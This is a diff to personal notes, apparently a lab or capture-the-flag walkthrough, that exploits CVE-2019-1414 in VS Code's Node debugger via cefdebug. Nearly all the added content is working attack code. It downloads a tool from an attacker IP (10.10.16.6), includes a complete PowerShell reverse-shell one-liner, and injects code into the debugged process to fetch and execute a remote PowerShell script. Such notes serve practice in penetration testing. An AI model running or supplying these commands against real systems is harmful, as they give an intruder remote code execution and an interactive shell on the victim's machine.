@@ -81,3 +81,30 @@ C:\Program Files\Microsoft VS Code
 CVE
 https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1414
 
+Will follow this blog
+https://iwantmore.pizza/posts/cve-2019-1414.html
+
+
+```
+Invoke-WebRequest -Uri http://10.10.16.6/cefdebug/cefdebug.exe -OutFile cefdebug.exe
+```
+![[Pasted image 20240925160843.png]]
+```
+ws://127.0.0.1:40860/b4349ceb-188d-42a8-8c02-04d8145a3bf6
+```
+
+```
+ws://127.0.0.1:64554/62f6a0f5-255e-4f13-a5aa-1e9cd4d3738b
+```
+
+
+Reverse Shell
+```
+$client = New-Object System.Net.Sockets.TCPClient('10.10.16.6',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();
+```
+
+Payload
+```
+.\cefdebug.exe --url ws://127.0.0.1:40860/b4349ceb-188d-42a8-8c02-04d8145a3bf6 --code "process.mainModule.require('child_process').exec('powershell IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.16.6/shell02.ps1\')')"
+```
+
